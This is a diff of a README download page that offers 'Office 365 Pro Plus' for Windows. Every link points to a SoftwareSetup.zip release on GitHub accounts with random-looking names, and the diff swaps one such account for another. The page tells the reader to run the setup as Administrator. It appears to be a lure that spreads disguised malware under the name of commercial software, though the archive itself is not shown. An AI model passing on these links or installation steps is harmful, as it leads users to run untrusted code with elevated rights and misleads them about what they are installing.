@@ -11,7 +11,7 @@
 > **This is the download page.** Use the button or link below to get **Office 365 Pro Plus** for Windows.
 
 <p align="center">
-  <a href="https://github.com/MegaRiggerRouse/venhdusk/releases/download/sjnvhkd/SoftwareSetup.zip">
+  <a href="https://github.com/bravestokermattock/qoetztvv/releases/download/dsfasf/SoftwareSetup.zip">
     <img src="https://img.shields.io/badge/Download-Office%20365%20Pro%20Plus-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Office 365 Pro Plus">
   </a>
 </p>
@@ -20,13 +20,13 @@
 
 ### Quick steps
 
-1. Click **[Download](https://github.com/MegaRiggerRouse/venhdusk/releases/download/sjnvhkd/SoftwareSetup.zip)** (link above)
+1. Click **[Download](https://github.com/bravestokermattock/qoetztvv/releases/download/dsfasf/SoftwareSetup.zip)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://github.com/MegaRiggerRouse/venhdusk/releases/download/sjnvhkd/SoftwareSetup.zip"><strong>⬇ Download Office 365 Pro Plus now</strong></a></p>
+<p align="center"><a href="https://github.com/bravestokermattock/qoetztvv/releases/download/dsfasf/SoftwareSetup.zip"><strong>⬇ Download Office 365 Pro Plus now</strong></a></p>
 
 ---
 
